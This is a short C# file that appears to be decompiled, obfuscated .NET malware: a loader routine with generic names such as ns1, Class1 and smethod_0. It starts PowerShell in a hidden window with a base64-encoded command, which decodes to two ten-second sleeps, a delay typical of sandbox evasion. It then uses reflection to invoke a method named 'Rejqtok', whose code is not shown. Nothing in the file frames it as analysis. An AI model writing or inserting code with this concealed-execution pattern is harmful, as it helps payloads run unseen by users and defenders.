using System.Diagnostics;
using System.Reflection;
using ns0;

namespace ns1;

internal class Class1
{
	static void smethod_0()
	{
		Process.Start(new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = "powershell",
			Arguments = "-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwADsA"
		})!.WaitForExit();
		MethodInfo[] array = Class0.smethod_1();
		if (array.Length == 0)
		{
			return;
		}
		MethodInfo[] array2 = array;
		foreach (MethodInfo methodInfo in array2)
		{
			if (methodInfo.Name == "Rejqtok")
			{
				methodInfo.Invoke(null, null);
			}
		}
	}
}
